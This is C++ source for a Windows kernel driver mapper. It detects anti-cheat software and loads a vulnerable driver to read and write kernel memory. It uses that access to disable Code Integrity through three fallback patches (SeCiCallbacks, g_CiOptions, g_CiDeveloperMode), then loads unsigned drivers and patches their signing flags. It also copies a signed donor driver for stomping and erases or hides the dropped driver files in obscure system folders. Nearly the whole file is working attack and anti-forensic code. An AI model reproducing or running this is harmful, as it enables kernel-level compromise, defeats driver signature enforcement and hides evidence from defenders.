
#include "Mapper.h"
#include "EmbeddedDriver.h"
#include <Shlwapi.h>
#include <cstdio>
#include <tlhelp32.h>
#include <string>
#include <initguid.h>
#include <wintrust.h>
#include <softpub.h>
#include <wincrypt.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wintrust.lib")

static BOOL CheckAntiCheatRunning() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                for (int i = 0; i < SignedMemory::g_AntiCheatProcessesCount; i++) {
                    if (_wcsicmp(pe32.szExeFile, SignedMemory::g_AntiCheatProcesses[i]) == 0) {
                        wprintf(L"[-] Anti-cheat process detected: %s\n", pe32.szExeFile);
                        CloseHandle(hSnapshot);
                        return TRUE;
                    }
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }

    LPVOID driverAddrs[2048];
    DWORD cbNeeded = 0;
    if (EnumDeviceDrivers(driverAddrs, sizeof(driverAddrs), &cbNeeded)) {
        DWORD driverCount = cbNeeded / sizeof(LPVOID);
        if (driverCount > 2048) driverCount = 2048;
        for (DWORD i = 0; i < driverCount; i++) {
            WCHAR driverName[256];
            if (GetDeviceDriverBaseNameW(driverAddrs[i], driverName, 256)) {
                for (int j = 0; j < SignedMemory::g_AntiCheatDriversCount; j++) {
                    if (_wcsicmp(driverName, SignedMemory::g_AntiCheatDrivers[j]) == 0) {
                        wprintf(L"[-] Anti-cheat driver loaded: %s\n", driverName);
                        return TRUE;
                    }
                }
            }
        }
    }

    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCM) {
        for (int i = 0; i < SignedMemory::g_AntiCheatServicesCount; i++) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, SignedMemory::g_AntiCheatServices[i], SERVICE_QUERY_STATUS);
            if (hSvc) {
                SERVICE_STATUS_PROCESS ssp = {};
                DWORD needed = 0;
                if (QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO,
                    (LPBYTE)&ssp, sizeof(ssp), &needed)) {
                    if (ssp.dwCurrentState == SERVICE_RUNNING ||
                        ssp.dwCurrentState == SERVICE_START_PENDING) {
                        wprintf(L"[-] Anti-cheat service running: %s\n", SignedMemory::g_AntiCheatServices[i]);
                        CloseServiceHandle(hSvc);
                        CloseServiceHandle(hSCM);
                        return TRUE;
                    }
                }
                CloseServiceHandle(hSvc);
            }
        }
        CloseServiceHandle(hSCM);
    }

    return FALSE;
}

namespace Utils {

    std::wstring GenerateRandomName(size_t length) {
        static const wchar_t charset[] = L"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        static std::random_device rd;
        static std::mt19937 gen(rd());
        static std::uniform_int_distribution<> dist(0, static_cast<int>(wcslen(charset) - 1));

        std::wstring result;
        result.reserve(length);

        for (size_t i = 0; i < length; i++) {
            result += charset[dist(gen)];
        }

        return result;
    }

    BOOL InitializeNtFunctions() {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (!ntdll) {
            ntdll = LoadLibraryW(L"ntdll.dll");
            if (!ntdll) {
                return FALSE;
            }
        }

        NtQuerySystemInformationPtr = reinterpret_cast<pNtQuerySystemInformation>(
            GetProcAddress(ntdll, "NtQuerySystemInformation")
        );

        NtLoadDriverPtr = reinterpret_cast<pNtLoadDriver>(
            GetProcAddress(ntdll, "NtLoadDriver")
        );

        NtUnloadDriverPtr = reinterpret_cast<pNtUnloadDriver>(
            GetProcAddress(ntdll, "NtUnloadDriver")
        );

        RtlAdjustPrivilegePtr = reinterpret_cast<pRtlAdjustPrivilege>(
            GetProcAddress(ntdll, "RtlAdjustPrivilege")
        );

        RtlGetFullPathName_UExPtr = reinterpret_cast<pRtlGetFullPathName_UEx>(
            GetProcAddress(ntdll, "RtlGetFullPathName_UEx")
        );

        RtlCreateRegistryKeyPtr = reinterpret_cast<pRtlCreateRegistryKey>(
            GetProcAddress(ntdll, "RtlCreateRegistryKey")
        );

        RtlWriteRegistryValuePtr = reinterpret_cast<pRtlWriteRegistryValue>(
            GetProcAddress(ntdll, "RtlWriteRegistryValue")
        );

        NtDeviceIoControlFilePtr = reinterpret_cast<pNtDeviceIoControlFile>(
            GetProcAddress(ntdll, "NtDeviceIoControlFile")
        );

        NtDeleteKeyPtr = reinterpret_cast<pNtDeleteKey>(
            GetProcAddress(ntdll, "NtDeleteKey")
        );

        NtOpenKeyPtr = reinterpret_cast<pNtOpenKey>(
            GetProcAddress(ntdll, "NtOpenKey")
        );

        NtFlushKeyPtr = reinterpret_cast<pNtFlushKey>(
            GetProcAddress(ntdll, "NtFlushKey")
        );

        // Optional — POSIX delete for loaded driver image cleanup.
        // Not in the required check: graceful fallback to standard deletion.
        NtCreateFilePtr = reinterpret_cast<pNtCreateFile>(
            GetProcAddress(ntdll, "NtCreateFile")
        );
        NtSetInformationFilePtr = reinterpret_cast<pNtSetInformationFile>(
            GetProcAddress(ntdll, "NtSetInformationFile")
        );

        return NtQuerySystemInformationPtr && NtLoadDriverPtr &&
               NtUnloadDriverPtr && RtlAdjustPrivilegePtr &&
               RtlGetFullPathName_UExPtr && RtlCreateRegistryKeyPtr &&
               RtlWriteRegistryValuePtr && NtDeviceIoControlFilePtr;
    }

    NTSTATUS AdjustPrivilege(ULONG privilege, BOOLEAN enable) {
        BOOLEAN wasEnabled;
        return RtlAdjustPrivilegePtr(privilege, enable, FALSE, &wasEnabled);
    }

    NTSTATUS GetFullPath(PCWSTR fileName, PWSTR buffer, ULONG bufferLength) {
        return RtlGetFullPathName_UExPtr(fileName, bufferLength, buffer, nullptr, nullptr);
    }

    BOOL SecureDeleteFile(PCWSTR filePath) {
        HANDLE hFile = CreateFileW(
            filePath,
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            nullptr,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            nullptr
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            LARGE_INTEGER fileSize;
            if (GetFileSizeEx(hFile, &fileSize) && fileSize.QuadPart > 0) {
                DWORD chunkSize = 4096;
                BYTE zeroBuffer[4096];
                SecureZeroMemory(zeroBuffer, sizeof(zeroBuffer));

                SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                LONGLONG remaining = fileSize.QuadPart;
                while (remaining > 0) {
                    DWORD toWrite = static_cast<DWORD>(min(static_cast<LONGLONG>(chunkSize), remaining));
                    DWORD written = 0;
                    WriteFile(hFile, zeroBuffer, toWrite, &written, nullptr);
                    remaining -= written;
                    if (written == 0) break;
                }
                FlushFileBuffers(hFile);
            }
            CloseHandle(hFile);
        }

        SetFileAttributesW(filePath, FILE_ATTRIBUTE_NORMAL);
        return DeleteFileW(filePath);
    }

    // POSIX delete via FileDispositionInformationEx (class 64).
    // Immediately unlinks the directory entry even when the file has a mapped
    // image section (which is the case after NtLoadDriver).  Standard deletion
    // methods (DeleteFileW, FILE_DELETE_ON_CLOSE, FILE_DISPOSITION_INFORMATION)
    // all fail with STATUS_CANNOT_DELETE because the section object holds a
    // reference.  POSIX semantics remove the name while keeping the data stream
    // alive until the last handle/section is closed.  Requires Win10 1607+ / NTFS.
    BOOL PosixDeleteFile(PCWSTR filePath) {
        if (!filePath || !NtCreateFilePtr || !NtSetInformationFilePtr)
            return FALSE;

        // Build NT path (\??\C:\...)
        WCHAR ntPath[520] = {};
        wcscpy_s(ntPath, L"\\??\\");
        wcscat_s(ntPath, filePath);

        UNICODE_STRING uniPath;
        RtlInitUnicodeString(&uniPath, ntPath);

        OBJECT_ATTRIBUTES objAttr;
        InitializeObjectAttributes(&objAttr, &uniPath,
            OBJ_CASE_INSENSITIVE, NULL, NULL);

        HANDLE fileHandle = NULL;
        IO_STATUS_BLOCK ioStatus = {};

        NTSTATUS status = NtCreateFilePtr(
            &fileHandle,
            DELETE | SYNCHRONIZE,
            &objAttr,
            &ioStatus,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL, 0
        );

        if (!NT_SUCCESS(status))
            return FALSE;

        // FileDispositionInformationEx = 64
        struct {
            ULONG Flags;
        } dispEx;
        dispEx.Flags = 0x1   // FILE_DISPOSITION_FLAG_DELETE
                     | 0x2   // FILE_DISPOSITION_FLAG_POSIX_SEMANTICS
                     | 0x10; // FILE_DISPOSITION_FLAG_IGNORE_READONLY_ATTRIBUTE

        status = NtSetInformationFilePtr(
            fileHandle, &ioStatus,
            &dispEx, sizeof(dispEx),
            static_cast<FILE_INFORMATION_CLASS>(64)
        );

        NtClose(fileHandle);
        return NT_SUCCESS(status);
    }

    // Returns a random writable directory from a pool of inconspicuous
    // system locations. Falls back to the Windows system temp directory
    // (%SystemRoot%\Temp) if none of the candidates are available.
    std::wstring GetRandomSystemDirectory() {
        WCHAR winDir[MAX_PATH] = {};
        DWORD winLen = GetWindowsDirectoryW(winDir, MAX_PATH);
        if (winLen == 0 || winLen >= MAX_PATH)
            return L"";

        WCHAR programData[MAX_PATH] = {};
        DWORD pdLen = GetEnvironmentVariableW(L"ProgramData", programData, MAX_PATH);

        // Build a pool of plausible system directories that an admin has
        // write access to and where a stray .sys or .tmp won't look suspicious.
        std::wstring candidates[12];
        int count = 0;

        // Windows system temp (not user temp)
        candidates[count++] = std::wstring(winDir) + L"\\Temp";

        // Windows SoftwareDistribution — littered with random download artifacts
        candidates[count++] = std::wstring(winDir) + L"\\SoftwareDistribution\\Download";

        // Windows Prefetch — contains lots of opaque binary files
        candidates[count++] = std::wstring(winDir) + L"\\Prefetch";

        // Windows ServiceProfiles — deep, rarely inspected
        candidates[count++] = std::wstring(winDir) + L"\\ServiceProfiles\\LocalService\\AppData\\Local\\Temp";

        // Windows Logs — verbose, rarely cleaned
        candidates[count++] = std::wstring(winDir) + L"\\Logs\\MoSetup";

        // INF staging area
        candidates[count++] = std::wstring(winDir) + L"\\INF";

        if (pdLen > 0 && pdLen < MAX_PATH) {
            // ProgramData subfolders that always exist and accumulate cruft
            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\WER\\Temp";
            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Windows\\Caches";
            candidates[count++] = std::wstring(programData) + L"\\Microsoft\\Crypto\\RSA\\MachineKeys";
            candidates[count++] = std::wstring(programData) + L"\\USOShared\\Logs";
        }

        // Shuffle and pick the first writable candidate
        static std::mt19937 rng(static_cast<unsigned int>(__rdtsc()));
        for (int i = count - 1; i > 0; i--) {
            std::uniform_int_distribution<int> dist(0, i);
            int j = dist(rng);
            std::swap(candidates[i], candidates[j]);
        }

        for (int i = 0; i < count; i++) {
            DWORD attr = GetFileAttributesW(candidates[i].c_str());
            if (attr == INVALID_FILE_ATTRIBUTES)
                continue;
            if (!(attr & FILE_ATTRIBUTE_DIRECTORY))
                continue;

            // Probe write access by attempting to create and immediately delete a temp file
            std::wstring probe = candidates[i] + L"\\" + GenerateRandomName(8) + L".tmp";
            HANDLE hProbe = CreateFileW(probe.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_NEW, FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE, nullptr);
            if (hProbe != INVALID_HANDLE_VALUE) {
                CloseHandle(hProbe);
                return candidates[i];
            }
        }

        // Last resort: plain Windows\Temp (always writable for admins)
        return std::wstring(winDir) + L"\\Temp";
    }

    BOOL ForceDeleteOrRename(PCWSTR filePath) {
        // 1. Try standard deletion first
        if (DeleteFileW(filePath)) {
            return TRUE;
        }

        // 2. Try POSIX deletion (unlinks name while handle is open)
        if (PosixDeleteFile(filePath)) {
            return TRUE;
        }

        // 3. If the kernel locks the file heavily, rename it out of the way
        // into a random system directory so it's not sitting in an obvious spot.
        std::wstring hideDir = GetRandomSystemDirectory();
        if (!hideDir.empty()) {
            std::wstring newName = hideDir + L"\\" + GenerateRandomName(16) + L".tmp";
            if (MoveFileW(filePath, newName.c_str())) {
                SetFileAttributesW(newName.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
                MoveFileExW(newName.c_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                return TRUE;
            }
        }

        // 4. Last resort fallback
        SetFileAttributesW(filePath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY);
        MoveFileExW(filePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
        return FALSE;
    }

    std::wstring GetTempFilePath(PCWSTR extension) {
        std::wstring dir = GetRandomSystemDirectory();
        if (dir.empty())
            return L"";

        std::wstring name = GenerateRandomName(12);
        return dir + L"\\" + name + extension;
    }


}

namespace MapperCore {

    NTSTATUS TriggerExploit(PCWSTR targetDriverFileName, PCWSTR sentinelDriverFileName) {
        HANDLE deviceHandle = nullptr;
        NTSTATUS status = VulnDriver::OpenDevice(&deviceHandle);

        if (!NT_SUCCESS(status)) {
            printf("[*] Device not open, loading vuln driver... (0x%08X)\n", status);
            status = DriverLoader::LoadDriver(g_LoaderServicePath);

            if (!NT_SUCCESS(status) &&
                status != STATUS_OBJECT_NAME_COLLISION &&
                status != STATUS_IMAGE_ALREADY_LOADED) {
                printf("[-] Failed to load vuln driver: 0x%08X\n", status);
                return status;
            }
            printf("[*] Vuln driver loaded, opening device...\n");

            for (int retry = 0; retry < 10; retry++) {
                Sleep(100);
                status = VulnDriver::OpenDevice(&deviceHandle);
                if (NT_SUCCESS(status)) break;
            }

            if (!NT_SUCCESS(status)) {
                printf("[-] Failed to open device after retries: 0x%08X\n", status);
                return status;
            }
        }
        printf("[+] Device opened\n");


        {
            PVOID ciValidateImageHeaderEntry = nullptr;
            PVOID zwFlushInstructionCache = nullptr;

            if (KernelUtils::GetCiValidateImageHeaderEntry(&ciValidateImageHeaderEntry, &zwFlushInstructionCache) &&
                ciValidateImageHeaderEntry && zwFlushInstructionCache) {

                PVOID originalCallback = nullptr;
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                if (NT_SUCCESS(status)) {
                    g_OriginalCiCallback = originalCallback;
                    g_CiCallbackAddress = ciValidateImageHeaderEntry;

                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &zwFlushInstructionCache, sizeof(PVOID));
                    if (NT_SUCCESS(status)) {
                        g_CiCallbackPatched = true;
                        printf("[+] CI bypass: SeCiCallbacks replacement (Tier 1)\n");

                        printf("[*] Loading target driver...\n");
                        status = DriverLoader::LoadDriver(g_DriverServicePath);
                        printf("[*] Target driver load result: 0x%08X\n", status);

                        // Load Sentinel within the same CI bypass window
                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            printf("[*] Loading Sentinel driver...\n");
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                            printf("[*] Sentinel load result: 0x%08X\n", sentStatus);
                        }

                        VulnDriver::WriteKernelMemory(deviceHandle, ciValidateImageHeaderEntry, &originalCallback, sizeof(PVOID));
                        g_CiCallbackPatched = false;
                        printf("[+] SeCiCallbacks restored\n");

                        if (NT_SUCCESS(status)) {
                            printf("[*] Patching driver signing flags...\n");
                            if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName))
                                printf("[-] Signing flags patch failed\n");
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                printf("[*] Patching Sentinel signing flags...\n");
                                if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName))
                                    printf("[-] Sentinel signing flags patch failed\n");
                            }
                            goto done;
                        }
                        printf("[!] Tier 1 load failed, trying Tier 2...\n");
                    }
                }
            } else {
                printf("[!] SeCiCallbacks pattern scan failed, trying Tier 2...\n");
            }
        }


        {
            PVOID ciOptionsAddr = nullptr;
            if (KernelUtils::GetCiOptionsAddress(&ciOptionsAddr)) {
                DWORD currentOptions = 0;
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciOptionsAddr, &currentOptions, sizeof(DWORD));
                if (NT_SUCCESS(status)) {
                    g_CiOptionsAddress = ciOptionsAddr;
                    g_OriginalCiOptions = currentOptions;

                    DWORD patchedOptions = currentOptions | 0x8;
                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &patchedOptions, sizeof(DWORD));
                    if (NT_SUCCESS(status)) {
                        g_CiOptionsPatched = true;
                        printf("[+] CI bypass: g_CiOptions |= 0x8 TestSigning (Tier 2)\n");

                        printf("[*] Loading target driver...\n");
                        status = DriverLoader::LoadDriver(g_DriverServicePath);
                        printf("[*] Target driver load result: 0x%08X\n", status);

                        // Load Sentinel within the same CI bypass window
                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            printf("[*] Loading Sentinel driver...\n");
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                            printf("[*] Sentinel load result: 0x%08X\n", sentStatus);
                        }

                        VulnDriver::WriteKernelMemory(deviceHandle, ciOptionsAddr, &g_OriginalCiOptions, sizeof(DWORD));
                        g_CiOptionsPatched = false;
                        printf("[+] g_CiOptions restored to 0x%08X\n", g_OriginalCiOptions);

                        if (NT_SUCCESS(status)) {
                            printf("[*] Patching driver signing flags...\n");
                            if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName))
                                printf("[-] Signing flags patch failed\n");
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                printf("[*] Patching Sentinel signing flags...\n");
                                if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName))
                                    printf("[-] Sentinel signing flags patch failed\n");
                            }
                            goto done;
                        }
                        printf("[!] Tier 2 load failed, trying Tier 3...\n");
                    }
                }
            } else {
                printf("[!] g_CiOptions not found, trying Tier 3...\n");
            }
        }


        {
            PVOID ciDevModeAddr = nullptr;
            if (KernelUtils::GetCiDeveloperModeAddress(&ciDevModeAddr)) {
                DWORD currentDevMode = 0;
                status = VulnDriver::ReadKernelMemory(deviceHandle, ciDevModeAddr, &currentDevMode, sizeof(DWORD));
                if (NT_SUCCESS(status)) {
                    g_CiDevModeAddress = ciDevModeAddr;
                    g_OriginalCiDevMode = currentDevMode;


                    DWORD patchedDevMode = currentDevMode | 0x200 | 0x8000;
                    status = VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &patchedDevMode, sizeof(DWORD));
                    if (NT_SUCCESS(status)) {
                        g_CiDevModePatched = true;
                        printf("[+] CI bypass: g_CiDeveloperMode |= 0x8200 (Tier 3 - last resort)\n");

                        printf("[*] Loading target driver...\n");
                        status = DriverLoader::LoadDriver(g_DriverServicePath);
                        printf("[*] Target driver load result: 0x%08X\n", status);

                        // Load Sentinel within the same CI bypass window
                        NTSTATUS sentStatus = STATUS_UNSUCCESSFUL;
                        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
                            printf("[*] Loading Sentinel driver...\n");
                            sentStatus = DriverLoader::LoadDriver(g_SentinelServicePath);
                            printf("[*] Sentinel load result: 0x%08X\n", sentStatus);
                        }

                        VulnDriver::WriteKernelMemory(deviceHandle, ciDevModeAddr, &g_OriginalCiDevMode, sizeof(DWORD));
                        g_CiDevModePatched = false;
                        printf("[+] g_CiDeveloperMode restored to 0x%08X\n", g_OriginalCiDevMode);

                        if (NT_SUCCESS(status)) {
                            printf("[*] Patching driver signing flags...\n");
                            if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, targetDriverFileName))
                                printf("[-] Signing flags patch failed\n");
                            if (NT_SUCCESS(sentStatus) && sentinelDriverFileName) {
                                printf("[*] Patching Sentinel signing flags...\n");
                                if (!KernelUtils::PatchDriverSigningFlags(deviceHandle, sentinelDriverFileName))
                                    printf("[-] Sentinel signing flags patch failed\n");
                            }
                            goto done;
                        }
                    }
                }
            }
            printf("[-] All CI bypass tiers failed\n");
            status = STATUS_UNSUCCESSFUL;
        }

done:
        // Write WhosWho's base address into Sentinel's .sntl section while the
        // vuln driver device handle is still open. Sentinel's init thread polls
        // this value and begins protection once it's non-zero.
        if (NT_SUCCESS(status) && sentinelDriverFileName && g_SentinelServicePath[0]) {
            // Find Sentinel's kernel base by enumerating loaded modules
            ULONG sentImageSize = 0;
            PVOID sentBase = KernelUtils::GetDriverBaseByName(sentinelDriverFileName, &sentImageSize);
            if (sentBase) {
                g_SentinelLoadAddress = sentBase;
                g_SentinelImageSize = sentImageSize;
                printf("[+] Sentinel base: %p, size: 0x%X\n", sentBase, sentImageSize);

                // Find WhosWho's base the same way
                ULONG whoswhoImageSize = 0;
                PVOID whoswhoBase = KernelUtils::GetDriverBaseByName(targetDriverFileName, &whoswhoImageSize);
                if (whoswhoBase) {
                    g_DriverLoadAddress = whoswhoBase;
                    printf("[+] WhosWho base: %p, size: 0x%X\n", whoswhoBase, whoswhoImageSize);

                    if (WriteSentinelGlobals(deviceHandle, sentBase, sentImageSize,
                                             whoswhoBase, whoswhoImageSize)) {
                        printf("[+] WhosWho base written to Sentinel .sntl section\n");
                    } else {
                        printf("[-] Failed to write globals to Sentinel\n");
                    }
                } else {
                    printf("[-] Could not find WhosWho in loaded modules\n");
                }
            } else {
                printf("[-] Could not find Sentinel in loaded modules\n");
            }
        }

        // Ensure the device handle is closed BEFORE attempting to unload the driver.
        // If the handle is open, NtUnloadDriver marks it for unload but doesn't actually unload it,
        // causing the file to remain locked in the Temp directory indefinitely.
        VulnDriver::CloseDevice(deviceHandle);
        DriverLoader::UnloadDriver(g_LoaderServicePath);

        return status;
    }

    NTSTATUS WindLoadDriver(PCWSTR loaderPath, PCWSTR driverPath, PCWSTR sentinelPath) {
        printf("[*] Adjusting privileges...\n");
        NTSTATUS status = Utils::AdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE);
        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to adjust privilege: 0x%08X (run as admin)\n", status);
            return status;
        }

        WCHAR loaderFullPath[520];
        status = Utils::GetFullPath(loaderPath, loaderFullPath, sizeof(loaderFullPath));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        WCHAR driverFullPath[520];
        status = Utils::GetFullPath(driverPath, driverFullPath, sizeof(driverFullPath));
        if (!NT_SUCCESS(status)) {
            return status;
        }

        status = DriverLoader::CreateDriverService(g_DriverServicePath, driverFullPath);
        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to create target driver service: 0x%08X\n", status);
            return status;
        }

        status = DriverLoader::CreateDriverService(g_LoaderServicePath, loaderFullPath);
        if (!NT_SUCCESS(status)) {
            printf("[-] Failed to create loader service: 0x%08X\n", status);
            return status;
        }

        // Create Sentinel service if a sentinel path was provided
        WCHAR sentinelFullPath[520] = {};
        if (sentinelPath && sentinelPath[0]) {
            status = Utils::GetFullPath(sentinelPath, sentinelFullPath, sizeof(sentinelFullPath));
            if (!NT_SUCCESS(status)) {
                printf("[-] Failed to resolve Sentinel full path: 0x%08X\n", status);
                return status;
            }
            status = DriverLoader::CreateDriverService(g_SentinelServicePath, sentinelFullPath);
            if (!NT_SUCCESS(status)) {
                printf("[-] Failed to create Sentinel service: 0x%08X\n", status);
                return status;
            }
            printf("[+] Sentinel service created\n");
        }

        printf("[+] Services created\n");


        WCHAR donorPath[MAX_PATH] = {};
        BOOL donorIsEV = FALSE;
        BOOL donorFound = FALSE;
        WCHAR donorCopyPath[520] = {};

        {


            WCHAR driversDir[MAX_PATH];
            GetSystemDirectoryW(driversDir, MAX_PATH);
            wcscat_s(driversDir, L"\\drivers");

            WIN32_FIND_DATAW fd;
            WCHAR searchPat[MAX_PATH];
            wcscpy_s(searchPat, driversDir);
            wcscat_s(searchPat, L"\\*.sys");
            HANDLE hFind = FindFirstFileW(searchPat, &fd);
            int bestScore = 0;
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
                    if (fd.nFileSizeLow < 8192) continue;
                    WCHAR fullPath[MAX_PATH];
                    wcscpy_s(fullPath, driversDir);
                    wcscat_s(fullPath, L"\\");
                    wcscat_s(fullPath, fd.cFileName);


                    HANDLE hf = CreateFileW(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                        nullptr, OPEN_EXISTING, 0, nullptr);
                    if (hf == INVALID_HANDLE_VALUE) continue;
                    BYTE hdr[4096];
                    DWORD br = 0;
                    BOOL readOk = ReadFile(hf, hdr, sizeof(hdr), &br, nullptr);
                    CloseHandle(hf);
                    if (!readOk || br < 512) continue;

                    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hdr;
                    if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
                    if ((DWORD)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > br) continue;
                    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(hdr + dos->e_lfanew);
                    if (nt->Signature != IMAGE_NT_SIGNATURE) continue;
                    if (nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) continue;
                    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)nt;
                    if (nt64->OptionalHeader.NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_SECURITY) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].VirtualAddress == 0) continue;
                    if (nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY].Size < 128) continue;


                    WINTRUST_FILE_INFO wfi = {};
                    wfi.cbStruct = sizeof(wfi);
                    wfi.pcwszFilePath = fullPath;
                    GUID actionGUID = WINTRUST_ACTION_GENERIC_VERIFY_V2;
                    WINTRUST_DATA wtd = {};
                    wtd.cbStruct = sizeof(wtd);
                    wtd.dwUIChoice = WTD_UI_NONE;
                    wtd.fdwRevocationChecks = WTD_REVOKE_NONE;
                    wtd.dwUnionChoice = WTD_CHOICE_FILE;
                    wtd.pFile = &wfi;
                    wtd.dwStateAction = WTD_STATEACTION_VERIFY;
                    wtd.dwProvFlags = WTD_CACHE_ONLY_URL_RETRIEVAL;
                    LONG lStatus = WinVerifyTrust(NULL, &actionGUID, &wtd);
                    wtd.dwStateAction = WTD_STATEACTION_CLOSE;
                    WinVerifyTrust(NULL, &actionGUID, &wtd);

                    int score = (lStatus == ERROR_SUCCESS) ? 100 : 0;
                    if (score > bestScore) {
                        bestScore = score;
                        wcscpy_s(donorPath, fullPath);
                    }
                    if (bestScore >= 100) break;
                } while (FindNextFileW(hFind, &fd));
                FindClose(hFind);
            }
            donorFound = (bestScore > 0);
        }

        if (donorFound && donorPath[0]) {
            printf("[+] Donor for stomping: %ws\n", donorPath);

            PCWSTR targetDir = driverFullPath;
            PCWSTR lastSlash = wcsrchr(driverFullPath, L'\\');
            WCHAR targetDirBuf[520] = {};
            if (lastSlash) {
                wcsncpy_s(targetDirBuf, driverFullPath, lastSlash - driverFullPath + 1);
            } else {
                wcscpy_s(targetDirBuf, L".\\");
            }
            std::wstring donorCopyName = Utils::GenerateRandomName(10) + L".sys";
            wcscpy_s(donorCopyPath, targetDirBuf);
            wcscat_s(donorCopyPath, donorCopyName.c_str());
            if (!CopyFileW(donorPath, donorCopyPath, FALSE)) {
                printf("[-] Failed to copy donor: %lu\n", GetLastError());
                donorFound = FALSE;
            } else {

                SetFileAttributesW(donorCopyPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                MoveFileExW(donorCopyPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
                printf("[+] Donor copied to %ws\n", donorCopyPath);

                wcscpy_s(g_DonorCopyPath, donorCopyPath);
            }
        }

        PCWSTR targetFileName = wcsrchr(driverFullPath, L'\\');
        if (targetFileName) targetFileName++;
        else targetFileName = driverFullPath;

        // Resolve Sentinel filename for TriggerExploit (needed for signing flags patch)
        PCWSTR sentinelFileName = nullptr;
        if (sentinelFullPath[0]) {
            sentinelFileName = wcsrchr(sentinelFullPath, L'\\');
            if (sentinelFileName) sentinelFileName++;
            else sentinelFileName = sentinelFullPath;
            printf("[*] Sentinel driver filename resolved: %ws\n", sentinelFileName);
        }

        printf("[*] Target driver filename resolved: %ws\n", targetFileName);

        status = TriggerExploit(targetFileName, sentinelFileName);
        printf("[*] Exploit result: 0x%08X\n", status);

        // Always attempt to delete the unsigned target driver file after a
        // successful load.  The kernel-side POSIX delete in DriverEntry is
        // the primary mechanism, but the driver may not have been able to
        // resolve IoCreateFileEx or the POSIX info class may have failed.
        // This usermode attempt is a defense-in-depth fallback.
        if (NT_SUCCESS(status)) {
            if (Utils::ForceDeleteOrRename(driverFullPath)) {
                printf("[+] Target driver file deleted/renamed from disk\n");
            } else {
                printf("[-] Failed to fully delete target driver, marked for deletion on reboot\n");
            }
            // Also delete Sentinel's on-disk image
            if (sentinelFullPath[0]) {
                if (Utils::ForceDeleteOrRename(sentinelFullPath)) {
                    printf("[+] Sentinel driver file deleted/renamed from disk\n");
                } else {
